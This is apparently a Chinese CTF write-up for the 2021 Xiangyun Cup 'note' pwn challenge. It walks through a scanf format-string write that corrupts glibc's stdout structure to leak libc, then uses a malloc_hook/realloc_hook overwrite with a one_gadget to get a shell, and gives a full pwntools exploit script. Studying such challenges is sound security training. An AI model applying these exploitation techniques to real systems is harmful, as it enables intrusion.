## i春秋 2021祥云杯 pwn-note WP

`学习自Cooook（zyf giegie）`

程序简单好理解；给了libc版本；**问题在于如何libc泄露**

这道题主要在于通过scanf任意写，打io_file(修改stdout结构体的指针)，然后抬栈满足onegadget条件



b __isoc99_scanf 下断点后   %7$s是我们之前输入进去的格式化字符串，用于scanf任意地址写；可以看到  0x7f09403e8620 指向的内容是file结构体中的flag：0xfbad2887

![](C:\Users\李小丫\AppData\Roaming\Typora\typora-user-images\image-20210823152027644.png)

x进去看看，是stdout结构体

![image-20210823152421970](C:\Users\李小丫\AppData\Roaming\Typora\typora-user-images\image-20210823152421970.png)

ptype stdout 来查看结构体类型

![image-20210823152502931](C:\Users\李小丫\AppData\Roaming\Typora\typora-user-images\image-20210823152502931.png)

通过打此结构体来泄露libc地址；

由于scanf函数的第7个参数就是指向stdout_flag的指针，所以在我们向scanf输入内容时候就能修改到 stdout结构体内容，那么修改_IO_write_base,_IO_write_ptr,_flags 就可以了；`_IO_write_base`指向想要泄露的地方；`_IO_write_ptr`指向泄露结束的地址。（之后遇到puts或printf就会把 _IO_write_base 指向的内容打印出来）

最方便的就是直接覆盖_IO_write_base最低位为00即可，'\n'就行了。

还有就是，我们还需要将stdout结构体中的 read_ptr,read_end,read_base 三个指针置0；_flag 置为 0xfbad18** (为了设置`_IO_CURRENTLY_PUTTING=0x800`) 原因就是：（简述）

**put函数的执行流程 **：

- 实际最终调用的是 `_IO_2_1_stdout_`的`vtable`中的`__xsputn`，也就是`_IO_new_file_xsputn`函数。

最终会调用到`_IO_OVERFLOW`，也就是`_IO_new_file_overflow`。

```c
int
_IO_new_file_overflow (_IO_FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
```

要绕过这里的 if 判断；通常没有输出的话是0；

然后就是要面临 one_gadget 不起作用的情况，就是没有满足其参数的条件，那么可以调整栈来达到目的（[rsp+0x30 == NULL]）

即通过realloc来抬栈；因为realloc的汇编代码比malloc  进入hook函数前会多几个push指令,以及sub指令的参数不同；将malloc_hook 改为realloc（及其偏移）；将realloc_hook改为one_gadget;堆栈自行调整；

`_GI__libc_malloc`



![image-20210823235135201](C:\Users\李小丫\AppData\Roaming\Typora\typora-user-images\image-20210823235135201.png)

`libc_realloc`

![image-20210823235335815](C:\Users\李小丫\AppData\Roaming\Typora\typora-user-images\image-20210823235335815.png)

### zyf giegie's exp

```python
from pwn import *
sh = process('./note')
context.log_level = 'debug'
#gdb.attach(sh)
gdb.attach(sh, "b * $rebase(0x1235)")
#sh = remote('47.104.70.90', 25315)

def Write(Until, Text, opt = 0):
    sh.sendlineafter(Until, Text)

def Choice(opt):
    Write('choice: ', str(opt))

def add(size,content):
    Choice(1)
    sh.recvuntil('size: ')
    sh.sendline(str(size))
    sh.recvuntil('content: ')
    sh.send(content)

def say(content,content2):
    Choice(2)
    sh.recvuntil('say ? ')
    sh.send(content)
    sh.recvuntil('? ')
    sh.send(content2)

# Choice(2)
# payload1 = '%7$s'
# payload2 = p64(0xfbad1800)+p64(0)*3 + '\x00' + 'a'
# Write('say ? ', payload1)
# Write('? ', payload2) 
libc = ELF('./libc-2.23.so')
add(0x20, 'a\n')
say('%7$s', p64(0xfbad1800)+p64(0)*3  + '\n')
sh.recv(0x18)
leak = u64(sh.recv(8))
log.success('leak' + hex(leak))
libcbase = leak - 0x3c36e0
#libcbase = u64(sh.recv(8)) - 0x3c36e0
log.success('libcbase: ' + hex(libcbase))

malloc_hook = libc.symbols['__malloc_hook'] + libcbase
realloc = libc.symbols['realloc'] + libcbase


one = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
one_gadget = one[1] + libcbase
# gdb.attach(sh, 'b * ' + str(one_gadget))
say('%7$saaaa' + p64(malloc_hook - 8) + '\x00' * 0x50, p64(one_gadget)+ p64(realloc+6) + '\n')
# say('%8$lld' + p64(malloc_hook - 8), p64(one_gadget) + p64(realloc) + '\n')
# add(0x20, 'a\n')
Choice(1)
sh.recvuntil('size: ')
sh.sendline('1')


sh.interactive()
```

令人疑惑的是打这个脚本 为什么execve第二个参数rsp+0x30 和其要求的条件[rsp + 0x30] == NULL（这里是0x1） 不满足但却仍然成功getshell

![img](file:///C:\Users\李小丫\Documents\Tencent Files\2652148955\Image\C2C\53TB$Z9DHD3V9]95N{{NX2T.jpg)

而当我设置为0x0后也仍然可以成功；（realloc+8）即相比realloc+6少一个push（esp+8）

所以这里exp 的realloc的偏移；可以为  realloc +6 也可以为 realloc + 8；